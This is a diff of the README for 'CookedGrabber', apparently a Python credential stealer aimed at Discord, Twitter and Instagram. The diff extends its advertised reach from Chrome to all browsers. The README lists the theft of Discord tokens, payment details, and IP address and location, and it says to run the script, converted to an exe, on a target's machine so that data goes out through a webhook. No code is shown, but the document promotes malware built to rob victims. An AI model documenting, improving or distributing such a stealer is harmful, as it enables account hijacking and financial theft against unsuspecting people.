@@ -9,6 +9,7 @@ Discord , Twitter, Instagram cookies and token grabber
 ## Features
 
 - Easy to use
+- Alls navigators compatibility
 - Steal discord token
 - Steal discord payment informations
 - Steal IP adress and location
@@ -18,7 +19,6 @@ Discord , Twitter, Instagram cookies and token grabber
 ## Requirements
 
 - Windows OS only
-- Google Chrome installed
 - Python 3.x (unless it exe converted)
 - Modules: threadings, win32crypt, discord_webhook, subprocess, urllib.requests, requests, win32con, win32api (unless it exe converted)
 
@@ -37,7 +37,6 @@ Run CookedGrabber.py with your webhook (better if converted to exe) on the targe
  python CookedGrabber.py
 ```
 ## Coming soon features 
-- All web navigator compatibility
 - More optimisations , kill lags
 - More error bypass
 ## Disclaimer
